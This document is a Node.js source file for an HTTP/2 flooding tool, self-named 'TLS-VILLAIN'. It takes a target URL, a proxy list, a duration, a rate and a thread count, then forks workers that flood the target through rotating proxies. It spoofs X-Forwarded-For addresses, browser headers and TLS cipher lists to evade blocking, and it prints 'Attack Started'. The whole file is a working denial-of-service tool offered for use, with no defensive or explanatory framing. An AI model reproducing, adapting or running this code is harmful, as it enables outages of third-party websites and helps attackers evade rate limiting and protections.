process.on("uncaughtException", function (canCreateDiscussions) {});
process.on("unhandledRejection", function (canCreateDiscussions) {});
require("events").EventEmitter.defaultMaxListeners = 0;
const fs = require("fs");
const url = require("url");
const randstr = require("randomstring");
var path = require("path");
const cluster = require("cluster");
const http2 = require("http2");
var fileName = __filename;
var file = path.basename(__filename);
let headerbuilders;
let COOKIES = undefined;
let POSTDATA = undefined;
if (process.argv.length < 8) {
  console.log("node TLS-VILLAIN GET [Target] [Proxy List] [Time] 64 [Threads]");
  process.exit(0);
}
let randomparam = false;
var proxies = fs.readFileSync(process.argv[4], "utf-8").toString().replace(/\r/g, "").split("\n");
var rate = process.argv[6];
var target_url = process.argv[3];
const target = target_url.split("\"\"")[0];
process.argv.forEach(newScaleKey => {
  if (newScaleKey.includes("cookie=") && !process.argv[2].split("\"\"")[0].includes(newScaleKey)) {
    COOKIES = newScaleKey.slice(7);
  } else {
    if (newScaleKey.includes("postdata=") && !process.argv[2].split("\"\"")[0].includes(newScaleKey)) {
      if (process.argv[2].toUpperCase() != "POST") {
        console.error("Method Invalid (Has Postdata But Not POST Method)");
        process.exit(1);
      }
      POSTDATA = newScaleKey.slice(9);
    } else {
      if (newScaleKey.includes("randomstring=")) {
        randomparam = newScaleKey.slice(13);
        console.log("[Info] RandomString Mode Enabled.");
      } else {
        if (newScaleKey.includes("headerdata=")) {
          headerbuilders = {
            accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
            "accept-encoding": "gzip, deflate, br",
            "accept-language": "en-US,en;q=0.9",
            "sec-ch-ua": "Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Opera\";v=\"86\", \"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\"",
            "sec-ch-ua-mobile": "?0",
            "sec-ch-ua-platform": "\"Windows\"",
            "sec-fetch-dest": "empty",
            "sec-fetch-site": "cross-site",
            "sec-fetch-mode": "navigate",
            "sec-fetch-user": "?1",
            TE: "trailers",
            Pragma: "no-cache",
            "upgrade-insecure-requests": 1,
            "Cache-Control": "max-age=0",
            Referer: target,
            "X-Forwarded-For": `${""}${randstr.generate({
              length: 1,
              charset: "12"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${"."}${randstr.generate({
              length: 1,
              charset: "12"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${"."}${randstr.generate({
              length: 1,
              charset: "12"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${"."}${randstr.generate({
              length: 1,
              charset: "12"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${""}${randstr.generate({
              length: 1,
              charset: "012345"
            })}${""}`,
            Cookie: COOKIES,
            ":method": "GET"
          };
          if (newScaleKey.slice(11).split("\"\"")[0].includes("&")) {
            const paramsSplit = newScaleKey.slice(11).split("\"\"")[0].split("&");
            for (let i = 0; i < paramsSplit.length; i++) {
              const signedTransactionsCounter = paramsSplit[i].split("=")[0];
              const signedTxHex = paramsSplit[i].split("=")[1];
              headerbuilders[signedTransactionsCounter] = signedTxHex;
            }
          } else {
            const componentsStr = newScaleKey.slice(11).split("\"\"")[0];
            const signedTransactionsCounter = componentsStr.split("=")[0];
            const signedTxHex = componentsStr.split("=")[1];
            headerbuilders[signedTransactionsCounter] = signedTxHex;
          }
        }
      }
    }
  }
});
if (COOKIES !== undefined) {
  console.log("[Info] Custom Cookie Mode Enabled.");
} else {
  COOKIES = "";
}
if (POSTDATA !== undefined) {
  console.log("[Info] Custom PostData Mode Enabled.");
} else {
  POSTDATA = "";
}
if (headerbuilders !== undefined) {
  console.log("[Info] Custom HeaderData Mode Enabled.");
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
      console.log(`${"[Info] Thread: "}${i}${" Created Successfully."}`);
    }
    console.log("[Info] Attack Started.");
    setTimeout(() => {
      process.exit(1);
    }, process.argv[5] * 1000);
  } else {
    startflood();
  }
} else {
  headerbuilders = {
    accept: "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-encoding": "gzip, deflate, br",
    "accept-language": "en-US,en;q=0.9",
    "sec-ch-ua": "Not A;Brand\";v=\"99\", \"Chromium\";v=\"99\", \"Opera\";v=\"86\", \"Microsoft Edge\";v=\"100\", \"Google Chrome\";v=\"101\"",
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": "\"Windows\"",
    "sec-fetch-dest": "empty",
    "sec-fetch-site": "cross-site",
    "sec-fetch-mode": "navigate",
    "sec-fetch-user": "?1",
    TE: "trailers",
    Pragma: "no-cache",
    "upgrade-insecure-requests": 1,
    "Cache-Control": "max-age=0",
    Referer: target,
    "X-Forwarded-For": `${""}${randstr.generate({
      length: 1,
      charset: "12"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${"."}${randstr.generate({
      length: 1,
      charset: "12"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${"."}${randstr.generate({
      length: 1,
      charset: "12"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${"."}${randstr.generate({
      length: 1,
      charset: "12"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${""}${randstr.generate({
      length: 1,
      charset: "012345"
    })}${""}`,
    Cookie: COOKIES,
    ":method": "GET"
  };
  if (cluster.isMaster) {
    for (let i = 0; i < process.argv[7]; i++) {
      cluster.fork();
      console.log(`${"[Info] Thread: "}${i}${" Created Successfully."}`);
    }
    console.log("[Info] Attack Started.");
    setTimeout(() => {
      process.exit(1);
    }, process.argv[5] * 1000);
  } else {
    startflood();
  }
}
var parsed = url.parse(target);
process.setMaxListeners(0);

function ra() {
  const randomString = randstr.generate({
    charset: "0123456789ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789",
    length: 4
  });
  return randomString;
}
const UAs = ["Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36"]
function spoof() {
  return `${""}${randstr.generate({
    length: 1,
    charset: "12"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${"."}${randstr.generate({
    length: 1,
    charset: "12"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${"."}${randstr.generate({
    length: 1,
    charset: "12"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${"."}${randstr.generate({
    length: 1,
    charset: "12"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${""}${randstr.generate({
    length: 1,
    charset: "012345"
  })}${""}`;
}
const cplist = ["options2.TLS_AES_128_GCM_SHA256:options2.TLS_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_128_CBC_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256:options2.TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA:options2.TLS_ECDHE_ECDSA_WITH_AES_256_GCM_SHA384:options2.TLS_ECDHE_ECDSA_WITH_RC4_128_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA:options2.TLS_RSA_WITH_AES_128_CBC_SHA256:options2.TLS_RSA_WITH_AES_128_GCM_SHA256:options2.TLS_RSA_WITH_AES_256_CBC_SHA", "TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA256:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES256-SHA384:ECDHE-RSA-AES256-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA", ":ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES256-GCM-SHA384:ECDHE-ECDSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:DHE-DSS-AES128-GCM-SHA256:kEDH+AESGCM:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA:ECDHE-ECDSA-AES128-SHA:ECDHE-RSA-AES256-SHA384:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA:ECDHE-ECDSA-AES256-SHA:DHE-RSA-AES128-SHA256:DHE-RSA-AES128-SHA:DHE-DSS-AES128-SHA256:DHE-RSA-AES256-SHA256:DHE-DSS-AES256-SHA:DHE-RSA-AES256-SHA:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!3DES:!MD5:!PSK", "RC4-SHA:RC4:ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:RC4-SHA:RC4:HIGH:!MD5:!aNULL:!EDH:!AESGCM", "ECDHE-RSA-AES256-SHA:AES256-SHA:HIGH:!AESGCM:!CAMELLIA:!3DES:!EDH"];

function startflood() {
  if (process.argv[2].toUpperCase() == "POST") {
    const _0x2cffx1e = url.parse(target).path.replace("%RAND%", ra());

    headerbuilders[":method"] = "POST";

    headerbuilders["Content-Type"] = "text/plain";
    if (randomparam) {
      setInterval(() => {
        headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
        var e3 = cplist[Math.floor(Math.random() * cplist.length)];
        var url = proxies[Math.floor(Math.random() * proxies.length)];
        url = url.split(":");
        var http = require("http");
        var net = require("tls");
        /** @type {string} */
        net.DEFAULT_MAX_VERSION = "TLSv1.3";
        var sshConn = http.request({
          host: url[0],
          port: url[1],
          ciphers: e3,
          method: "CONNECT",
          path: parsed.host + ":443"
        }, canCreateDiscussions => {
          sshConn.end();
          return;
        });
        sshConn.on("connect", function (canCreateDiscussions, p, isSlidingUp) {
          const reqres2 = http2.connect(parsed.href, {
            createConnection: () => {
              return net.connect({
                host: parsed.host,
                ciphers: e3,
                secureProtocol: "TLS_method",
                servername: parsed.host,
                challengesToSolve: 5,
                cloudflareTimeout: 5000,
                cloudflareMaxTimeout: 30000,
                maxRedirects: 20,
                followAllRedirects: true,
                decodeEmails: false,
                gzip: true,
                servername: parsed.host,
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ["h2"],
                socket: p
              }, function () {
                for (let i = 0; i < rate; i++) {
                  headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${"?"}${randomparam}${"="}${randstr.generate({
                    length: 12,
                    charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"
                  })}${""}`;
                  headerbuilders["X-Forwarded-For"] = `${""}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${"."}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${"."}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${"."}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}`;
                  headerbuilders.Body = `${""}${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%", ra()) : POSTDATA}${""}`;
                  headerbuilders.Cookie.replace("%RAND%", ra());
                  const remote_request = reqres2.request(headerbuilders);
                  remote_request.end();
                  remote_request.on("response", () => {
                    remote_request.close();
                  });
                }
              });
            }
          });
        });
        sshConn.end();
      });
    } else {
      setInterval(() => {
        headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
        var e3 = cplist[Math.floor(Math.random() * cplist.length)];
        var url = proxies[Math.floor(Math.random() * proxies.length)];
        url = url.split(":");
        var http = require("http");
        var net = require("tls");

        net.DEFAULT_MAX_VERSION = "TLSv1.3";
        var sshConn = http.request({
          host: url[0],
          port: url[1],
          ciphers: e3,
          method: "CONNECT",
          path: parsed.host + ":443"
        }, canCreateDiscussions => {
          sshConn.end();
          return;
        });
        sshConn.on("connect", function (canCreateDiscussions, p, isSlidingUp) {
          const reqres2 = http2.connect(parsed.href, {
            createConnection: () => {
              return net.connect({
                host: `${""}${url.parse(target).path.includes("%RAND%") ? _0x2cffx1e : url.parse(target).path}${""}`,
                ciphers: e3,
                secureProtocol: "TLS_method",
                servername: parsed.host,
                challengesToSolve: 5,
                cloudflareTimeout: 5000,
                cloudflareMaxTimeout: 30000,
                maxRedirects: 20,
                followAllRedirects: true,
                decodeEmails: false,
                gzip: true,
                servername: parsed.host,
                secure: true,
                rejectUnauthorized: false,
                ALPNProtocols: ["h2"],
                socket: p
              }, function () {
                for (let i = 0; i < rate; i++) {
                  headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${""}`;
                  headerbuilders["X-Forwarded-For"] = `${""}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${"."}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${"."}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${"."}${randstr.generate({
                    length: 1,
                    charset: "12"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}${randstr.generate({
                    length: 1,
                    charset: "012345"
                  })}${""}`;
                  headerbuilders.Body = `${""}${POSTDATA.includes("%RAND%") ? POSTDATA.replace("%RAND%", ra()) : POSTDATA}${""}`;
                  headerbuilders.Cookie.replace("%RAND%", ra());
                  const remote_request = reqres2.request(headerbuilders);
                  remote_request.end();
                  remote_request.on("response", () => {
                    remote_request.close();
                  });
                }
              });
            }
          });
        });
        sshConn.end();
      });
    }
  } else {
    if (process.argv[2].toUpperCase() == "GET") {

      headerbuilders[":method"] = "GET";
      if (randomparam) {
        setInterval(() => {
          headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
          var e3 = cplist[Math.floor(Math.random() * cplist.length)];
          var url = proxies[Math.floor(Math.random() * proxies.length)];
          url = url.split(":");
          var http = require("http");
          var net = require("tls");
          /** @type {string} */
          net.DEFAULT_MAX_VERSION = "TLSv1.3";
          var sshConn = http.request({
            host: url[0],
            port: url[1],
            ciphers: e3,
            method: "CONNECT",
            path: parsed.host + ":443"
          }, canCreateDiscussions => {
            sshConn.end();
            return;
          });
          sshConn.on("connect", function (canCreateDiscussions, p, isSlidingUp) {
            const reqres2 = http2.connect(parsed.href, {
              createConnection: () => {
                return net.connect({
                  host: parsed.host,
                  ciphers: e3,
                  secureProtocol: "TLS_method",
                  servername: parsed.host,
                  challengesToSolve: 5,
                  cloudflareTimeout: 5000,
                  cloudflareMaxTimeout: 30000,
                  maxRedirects: 20,
                  followAllRedirects: true,
                  decodeEmails: false,
                  gzip: true,
                  servername: parsed.host,
                  secure: true,
                  rejectUnauthorized: false,
                  ALPNProtocols: ["h2"],
                  socket: p
                }, function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${"?"}${randomparam}${"="}${randstr.generate({
                      length: 12,
                      charset: "ABCDEFGHIJKLMNOPQRSTUVWSYZabcdefghijklmnopqrstuvwsyz0123456789"
                    })}${""}`;
                    headerbuilders["X-Forwarded-For"] = `${""}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${"."}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${"."}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${"."}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}`;
                    headerbuilders.Cookie.replace("%RAND%", ra());
                    const remote_request = reqres2.request(headerbuilders);
                    remote_request.end();
                    remote_request.on("response", () => {
                      remote_request.close();
                    });
                  }
                });
              }
            });
          });
          sshConn.end();
        });
      } else {
        setInterval(() => {
          headerbuilders["User-agent"] = UAs[Math.floor(Math.random() * UAs.length)];
          var e3 = cplist[Math.floor(Math.random() * cplist.length)];
          var url = proxies[Math.floor(Math.random() * proxies.length)];
          url = url.split(":");
          var http = require("http");
          var net = require("tls");

          net.DEFAULT_MAX_VERSION = "TLSv1.3";
          var sshConn = http.request({
            host: url[0],
            port: url[1],
            ciphers: e3,
            method: "CONNECT",
            path: parsed.host + ":443"
          }, canCreateDiscussions => {
            sshConn.end();
            return;
          });
          sshConn.on("connect", function (canCreateDiscussions, p, isSlidingUp) {
            const reqres2 = http2.connect(parsed.href, {
              createConnection: () => {
                return net.connect({
                  host: parsed.host,
                  ciphers: e3,
                  secureProtocol: "TLS_method",
                  servername: parsed.host,
                  challengesToSolve: 5,
                  cloudflareTimeout: 5000,
                  cloudflareMaxTimeout: 30000,
                  maxRedirects: 20,
                  followAllRedirects: true,
                  decodeEmails: false,
                  gzip: true,
                  servername: parsed.host,
                  secure: true,
                  rejectUnauthorized: false,
                  ALPNProtocols: ["h2"],
                  socket: p
                }, function () {
                  for (let i = 0; i < rate; i++) {
                    headerbuilders[":path"] = `${""}${url.parse(target).path.replace("%RAND%", ra())}${""}`;
                    headerbuilders["X-Forwarded-For"] = `${""}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${"."}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${"."}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${"."}${randstr.generate({
                      length: 1,
                      charset: "12"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}${randstr.generate({
                      length: 1,
                      charset: "012345"
                    })}${""}`;
                    headerbuilders.Cookie.replace("%RAND%", ra());
                    const remote_request = reqres2.request(headerbuilders);
                    remote_request.end();
                    remote_request.on("response", () => {
                      remote_request.close();
                    });
                  }
                });
              }
            });
          });
          sshConn.end();
        });
      }
    } else {
      console.log("[Info] Invalid Method.");
      process.exit(1);
    }
  }
}
;}